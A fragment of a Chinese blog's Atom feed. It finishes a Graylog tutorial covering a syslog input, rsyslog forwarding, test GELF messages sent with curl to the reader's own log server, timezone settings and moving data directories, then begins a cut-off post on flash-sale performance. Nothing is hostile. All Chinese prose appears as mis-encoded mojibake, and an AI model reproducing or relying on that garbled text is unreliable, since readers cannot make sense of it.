&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;é…ç½®GraylogæœåŠ¡å™¨æ¥æ”¶å…¶ä»–æœåŠ¡å™¨çš„syslogæ—¥å¿—&quot;&gt;&lt;a href=&quot;#é…ç½®GraylogæœåŠ¡å™¨æ¥æ”¶å…¶ä»–æœåŠ¡å™¨çš„syslogæ—¥å¿—&quot; class=&quot;headerlink&quot; title=&quot;é…ç½®GraylogæœåŠ¡å™¨æ¥æ”¶å…¶ä»–æœåŠ¡å™¨çš„syslogæ—¥å¿—&quot;&gt;&lt;/a&gt;é…ç½®GraylogæœåŠ¡å™¨æ¥æ”¶å…¶ä»–æœåŠ¡å™¨çš„syslogæ—¥å¿—&lt;/h3&gt;&lt;h4 id=&quot;ç™»å½•Graylog-Web&quot;&gt;&lt;a href=&quot;#ç™»å½•Graylog-Web&quot; class=&quot;headerlink&quot; title=&quot;ç™»å½•Graylog Web&quot;&gt;&lt;/a&gt;ç™»å½•Graylog Web&lt;/h4&gt;&lt;p&gt;ä½¿ç”¨æµè§ˆå™¨è®¿é—®GraylogæœåŠ¡å™¨çš„åŸŸåæˆ–IPï¼š&lt;strong&gt;&lt;a href=&quot;http://graylog_public_IP_domain:9000/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://graylog_public_IP_domain:9000/&lt;/a&gt;&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä½ åº”è¯¥èƒ½çœ‹åˆ°ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½¿ç”¨adminåšä¸ºç”¨æˆ·åå’Œå‰é¢è®¾ç½®çš„å¯†ç ç™»å½•ã€‚&lt;/p&gt;
&lt;p&gt;ç™»å½•ä¹‹åï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢çš„çº¢æ•°å­—1æ˜¯é€šçŸ¥ï¼ˆyou have a node without any running inputsï¼‰ï¼Œä¸‹é¢è®¾ç½®é€šè¿‡UDPæ¥æ”¶syslogã€‚&lt;/p&gt;
&lt;p&gt;åˆ›å»ºsyslog UDPè¾“å…¥&lt;/p&gt;
&lt;p&gt;æ·»åŠ è¦æ¥æ”¶çš„å…¶ä»–æœåŠ¡å™¨syslogæ—¥å¿—ï¼šSystem-&amp;gt;Inputs-&amp;gt;Syslog UDP-&amp;gt;Launch new inputã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å¼¹å‡ºçš„çª—å£ä¸Šè¾“å…¥å¦‚ä¸‹ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Title: syslog&lt;/li&gt;
&lt;li&gt;Port: 8514&lt;/li&gt;
&lt;li&gt;Bind address: è¿™é‡Œå†™Graylog-serveræœåŠ¡å™¨ä¸»æœºIP&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç‚¹å‡»Launch&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœä½ éœ€è¦æ”¶é›†å¤šä¸ªæœåŠ¡å™¨çš„æ—¥å¿—ï¼Œé‡å¤ä¸Šé¢æ­¥éª¤ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨ï¼Œæˆ‘ä»¬çš„GraylogæœåŠ¡å™¨å·²ç»åšå¥½äº†æ¥æ”¶å…¶ä»–æœåŠ¡å™¨å‘æ¥æ—¥å¿—çš„å‡†å¤‡ã€‚ä¸‹é¢æˆ‘ä»¬è¿˜éœ€è¦é…ç½®å…¶ä»–æœåŠ¡å™¨ï¼Œè®©è¿™äº›æœåŠ¡å™¨ç»™GraylogæœåŠ¡å™¨å‘é€æ—¥å¿—ã€‚&lt;/p&gt;
&lt;h4 id=&quot;é…ç½®å…¶ä»–æœåŠ¡å™¨ç»™GraylogæœåŠ¡å™¨å‘é€syslog&quot;&gt;&lt;a href=&quot;#é…ç½®å…¶ä»–æœåŠ¡å™¨ç»™GraylogæœåŠ¡å™¨å‘é€syslog&quot; class=&quot;headerlink&quot; title=&quot;é…ç½®å…¶ä»–æœåŠ¡å™¨ç»™GraylogæœåŠ¡å™¨å‘é€syslog&quot;&gt;&lt;/a&gt;é…ç½®å…¶ä»–æœåŠ¡å™¨ç»™GraylogæœåŠ¡å™¨å‘é€syslog&lt;/h4&gt;&lt;p&gt;å‚è€ƒå®˜ç½‘ï¼š&lt;a href=&quot;https://marketplace.graylog.org/addons/a47beb3b-0bd9-4792-a56a-33b27b567856&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ä»Linuxç³»ç»Ÿæ—¥å¿—å‘é€åˆ°Graylog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SSHç™»å½•â€œå…¶ä»–æœåŠ¡å™¨â€ï¼Œåˆ›å»ºrsyslogé…ç½®æ–‡ä»¶90-graylog.confï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/rsyslog.d/90-graylog.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ·»åŠ å¦‚ä¸‹ä»£ç ï¼ŒæŠŠ graylog_server_IP æ›¿æ¢ä¸ºGraylogæœåŠ¡å™¨ipåœ°å€ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$template GRAYLOGRFC5424,&amp;quot;&amp;lt;%pri%&amp;gt;%protocol-version% %timestamp:::date-rfc3339%    %HOSTNAME% %app-name% %procid% %msg%\n&amp;quot;
*.* @graylog_server_IP:8514;GRAYLOGRFC5424
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é‡å¯rsyslogæœåŠ¡ä½¿ç”Ÿæ•ˆï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/init.d/rsyslog restart
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é…ç½®å®Œæˆä¹‹åï¼Œå›åˆ°Graylog Webï¼Œç‚¹å‡»Sourcesï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ–°æ·»åŠ rsyslogã€‚&lt;/p&gt;
&lt;h4 id=&quot;Graylogä½¿ç”¨httpåè®®å‘é€ï¼š&quot;&gt;&lt;a href=&quot;#Graylogä½¿ç”¨httpåè®®å‘é€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;Graylogä½¿ç”¨httpåè®®å‘é€ï¼š&quot;&gt;&lt;/a&gt;Graylogä½¿ç”¨httpåè®®å‘é€ï¼š&lt;/h4&gt;&lt;p&gt;æ·»åŠ è¦æ¥æ”¶çš„å…¶ä»–æœåŠ¡å™¨syslogæ—¥å¿—ï¼šSystem-&amp;gt;Inputs-&amp;gt;GELF HTTP-&amp;gt;Launch new inputã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog14.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨æœåŠ¡å™¨ä¸Šé¢å‘é€ä¸‹é¢å‘½ä»¤ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight scheme&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[&lt;span class=&quot;name&quot;&gt;root@graylog-development&lt;/span&gt; ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d &#39;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;short_message&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;Hello there&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;host&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;example.org&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;facility&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;_foo&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;bar&quot;&lt;/span&gt;&amp;#125;&#39;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[&lt;span class=&quot;name&quot;&gt;root@graylog-development&lt;/span&gt; ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d &#39;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;short_message&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;æµ‹è¯•&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;host&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;example.org&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;facility&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;_foo&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;bar&quot;&lt;/span&gt;&amp;#125;&#39;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™é‡Œå®šä¹‰192.168.1.234 æ˜¯graylog-serveræœåŠ¡å™¨åœ°å€ 12201 ç«¯å£æ˜¯ä¹‹å‰åˆ›å»ºå¥½çš„ã€‚&lt;/p&gt;
&lt;h3 id=&quot;æœç´ Graylog&quot;&gt;&lt;a href=&quot;#æœç´ Graylog&quot; class=&quot;headerlink&quot; title=&quot;æœç´ Graylog&quot;&gt;&lt;/a&gt;æœç´ Graylog&lt;/h3&gt;&lt;p&gt;å‡å¦‚ä½ è¦æœç´¢helloï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢å®‰è£…é…ç½®äº†åŸºæœ¬çš„GraylogæœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;h3 id=&quot;æ—¶åŒºå’Œé«˜äº®è®¾ç½®&quot;&gt;&lt;a href=&quot;#æ—¶åŒºå’Œé«˜äº®è®¾ç½®&quot; class=&quot;headerlink&quot; title=&quot;æ—¶åŒºå’Œé«˜äº®è®¾ç½®&quot;&gt;&lt;/a&gt;æ—¶åŒºå’Œé«˜äº®è®¾ç½®&lt;/h3&gt;&lt;p&gt;adminå¸å·çš„æ—¶åŒºï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# vi /etc/graylog/server/server.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;30&lt;/span&gt; root_timezone = Asia/Shanghai&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/graylog-server restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å…¶ä»–å¸å·çš„é»˜è®¤æ—¶åŒºï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# vi /etc/graylog/web/web.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;18&lt;/span&gt; timezone=&lt;span class=&quot;string&quot;&gt;&quot;Asia/Shanghai&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/graylog-web restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å…è®¸æŸ¥è¯¢ç»“æœé«˜äº®ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# vi /etc/graylog/server/server.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;147&lt;/span&gt; allow_highlighting = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/graylog-server restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;ç§»åŠ¨æ•°æ®ç›®å½•&quot;&gt;&lt;a href=&quot;#ç§»åŠ¨æ•°æ®ç›®å½•&quot; class=&quot;headerlink&quot; title=&quot;ç§»åŠ¨æ•°æ®ç›®å½•&quot;&gt;&lt;/a&gt;ç§»åŠ¨æ•°æ®ç›®å½•&lt;/h3&gt;&lt;figure class=&quot;highlight livescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ç§»åŠ¨elasticsearchçš„æ•°æ®ç›®å½•&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo /etc/init.d/elasticsearch stop&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo cp -rp /var/lib/elasticsearch/ /data/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo vi /etc/sysconfig/elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; DATA_DIR=/data/elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo /etc/init.d/elasticsearch start&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ç§»åŠ¨mongoçš„æ•°æ®ç›®å½•&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo /etc/init.d/mongod stop&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo cp -rp /var/lib/mongo /data/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# sudo vi /etc/mongod.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;13&lt;/span&gt; dbpath=/&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt;/lib/mongo&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;13&lt;/span&gt; dbpath=/data/mongo&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[mtagent@access2 ~]$ sudo /etc/init.d/mongod start&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;å…¶ä½™å‚è€ƒæ–‡æ¡£&quot;&gt;&lt;a href=&quot;#å…¶ä½™å‚è€ƒæ–‡æ¡£&quot; class=&quot;headerlink&quot; title=&quot;å…¶ä½™å‚è€ƒæ–‡æ¡£&quot;&gt;&lt;/a&gt;å…¶ä½™å‚è€ƒæ–‡æ¡£&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://docs.graylog.org/en/1.3/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;å‚è€ƒå®˜ç½‘&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.topspeedsnail.com/archives/4066&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Centos7 æ­å»ºgraylog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://my.oschina.net/fitnessefan/blog/464351?utm_source=tuicool&amp;amp;utm_medium=referral&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Graylogâ€”â€”æ—¥å¿—èšåˆå·¥å…·ä¸­çš„åèµ·ä¹‹ç§€&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦: æèµ·æ—¥å¿—èšåˆå·¥å…·ï¼Œæœ‰å¼€æºç•Œçš„ELKï¼Œå•†ä¸šç•Œçš„Splunkï¼Œä½†æˆ‘è¦ä»‹ç»å¼€æºçš„åèµ·ä¹‹ç§€Graylogï¼Œå¯ä»¥è¯´æ˜¯é¾™å¤´è€å¤§Splunkçš„å¼€æºç‰ˆã€‚&lt;/p&gt;
&lt;h1 id=&quot;Graylogâ€”â€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch&quot;&gt;&lt;a href=&quot;#Graylogâ€”
    
    </summary>
    
      <category term="æ—¥å¿—åˆ†æå¹³å°" scheme="http://blog.yangcvo.me/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    
      <category term="Log analysis platform" scheme="http://blog.yangcvo.me/tags/Log-analysis-platform/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•è§£å†³ç§’æ€çš„æ€§èƒ½é—®é¢˜å’Œå¾®ä¿¡æ¨å¹¿æ´»åŠ¨çš„è®¨è®º</title>
    <link href="http://blog.yangcvo.me/2016/11/10/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E6%8A%BD%E5%A5%96%E7%9A%84%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E5%92%8C%E7%A7%92%E6%9D%80%E7%9A%84%E8%AE%A8%E8%AE%BA%20%20/"/>
    <id>http://blog.yangcvo.me/2016/11/10/è¿ç»´ç¬”è®°/å¦‚ä½•è§£å†³æŠ½å¥–çš„æ€§èƒ½é—®é¢˜å’Œç§’æ€çš„è®¨è®º  /</id>
    <published>2016-11-10T08:39:28.000Z</published>
    <updated>2016-12-15T14:25:24.000Z</updated>
    
    <content type="html">&lt;p&gt;æœ€è¿‘ä¸šåŠ¡è¯•æ°´å¾®ä¿¡æŠ½å¥–æ´»åŠ¨ï¼Œå…¬å¸ç°åœ¨æ‰“ç®—æ¨å¹¿ä¸‹äº§å“ã€‚å¢åŠ äº›ç²‰ä¸é‡ ä¹‹å‰ç»å¸¸çœ‹åˆ°æ·˜å®çš„åŒè¡Œä»¬è®¨è®ºç§’æ€ï¼Œè®¨è®ºç”µå•†ï¼Œè¿™æ¬¡ç»ˆäºè½®åˆ°æˆ‘ä»¬è‡ªå·±ç†è®ºç»“åˆå®é™…ä¸€æ¬¡äº†ã€‚&lt;/p&gt;
&lt;p&gt;psï¼šè¿›å…¥æ­£æ–‡å‰å…ˆè¯´ä¸€ç‚¹ä¸ªäººæ„Ÿå—ï¼Œä¹‹å‰çœ‹æ·˜å®çš„pptæ„Ÿè§‰éƒ½æ‡‚äº†ï¼Œç­‰åˆ°è‡ªå·±å‡ºè§£å†³æ–¹æ¡ˆçš„æ—¶å€™å‘ç°è¿˜æ˜¯æœ‰å¾ˆå¤šæƒ³ä¸åˆ°çš„åœ°æ–¹å…¶å®éƒ½æ²¡æ‡‚ï¼Œå†æ¬¡éªŒè¯äº†â€œç»†èŠ‚æ˜¯é­”é¬¼â€çš„ç†è®ºã€‚å¹¶ä¸”ä¸€ä¸ªäººçš„èƒ½åŠ›æœ‰é™ï¼Œåªæœ‰å¤§å®¶ä¸€èµ·è®¨è®ºæ‰èƒ½æƒ³çš„æ›´å‘¨å…¨ï¼Œæ›´ç»†è‡´ã€‚å¥½äº†ï¼Œé—²è¯å°‘è¯´ï¼Œä¸‹é¢è¿›å…¥æ­£æ–‡ã€‚&lt;/p&gt;
&lt;h4 id=&quot;ä¸€ã€æŠ½å¥–æ´»åŠ¨å¸¦æ¥äº†ä»€ä¹ˆï¼Ÿ&quot;&gt;&lt;a href=&quot;#ä¸€ã€æŠ½å¥–æ´»åŠ¨å¸¦æ¥äº†ä»€ä¹ˆï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€æŠ½å¥–æ´»åŠ¨å¸¦æ¥äº†ä»€ä¹ˆï¼Ÿ&quot;&gt;&lt;/a&gt;ä¸€ã€æŠ½å¥–æ´»åŠ¨å¸¦æ¥äº†ä»€ä¹ˆï¼Ÿ&lt;/h4&gt;&lt;p&gt;å¾®ä¿¡ç§¯åˆ†å…‘æ¢ç°é‡‘æˆ–æŠ¢è´­æŠ½å¥–æ´»åŠ¨ä¸€èˆ¬ä¼šç»è¿‡ã€å…³æ³¨å…¬ä¼—å·ã€‘ã€åˆ†äº«æ´»åŠ¨è·å¾—ç§¯åˆ†ã€‘ã€ç§¯åˆ†å…‘æ¢ã€‘ã€æŠ½å¥–å®‰å…¨ç¯èŠ‚ã€‘è¿™3ä¸ªå¤§ç¯èŠ‚ï¼Œè€Œå…¶ä¸­ã€æŠ¢è®¢å•ã€‘è¿™ä¸ªç¯èŠ‚æ˜¯æœ€è€ƒéªŒä¸šåŠ¡æä¾›æ–¹çš„æŠ—å‹èƒ½åŠ›çš„ã€‚&lt;/p&gt;
&lt;p&gt;ç§¯åˆ†å…‘æ¢ç¯èŠ‚ä¸€èˆ¬ä¼šå¸¦æ¥2ä¸ªé—®é¢˜ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1ã€é«˜å¹¶å‘&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ã€€ã€€æ¯”è¾ƒç«çƒ­çš„æŠ½å¥–åœ¨çº¿äººæ•°éƒ½æ˜¯20wèµ·çš„ï¼Œå¦‚æ­¤ä¹‹é«˜çš„åœ¨çº¿äººæ•°å¯¹äºç½‘ç«™æ¶æ„ä»å‰åˆ°åéƒ½æ˜¯ä¸€ç§è€ƒéªŒã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;2ã€æŠ½å¥–äººå‘˜è¿‡å¤š&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;3ã€ æŠ¢è®¢å•&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ã€€ã€€ä»»ä½•å•†å“éƒ½ä¼šæœ‰æ•°é‡ä¸Šé™ï¼Œå¦‚ä½•é¿å…æˆåŠŸä¸‹è®¢å•ä¹°åˆ°å•†å“çš„äººæ•°ä¸è¶…è¿‡å•†å“æ•°é‡çš„ä¸Šé™ï¼Œè¿™æ˜¯æ¯ä¸ªæŠ¢è´­æ´»åŠ¨éƒ½è¦é¢ä¸´çš„éš¾é¢˜ã€‚&lt;/p&gt;
&lt;h4 id=&quot;äºŒã€å¦‚ä½•è§£å†³ï¼Ÿ&quot;&gt;&lt;a href=&quot;#äºŒã€å¦‚ä½•è§£å†³ï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;äºŒã€å¦‚ä½•è§£å†³ï¼Ÿ&quot;&gt;&lt;/a&gt;äºŒã€å¦‚ä½•è§£å†³ï¼Ÿ&lt;/h4&gt;&lt;p&gt;é¦–å…ˆï¼Œäº§å“è§£å†³æ–¹æ¡ˆæˆ‘ä»¬å°±ä¸äºˆè®¨è®ºäº†ã€‚æˆ‘ä»¬åªè®¨è®ºæŠ€æœ¯è§£å†³æ–¹æ¡ˆ&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1ã€å‰ç«¯&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight armasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div 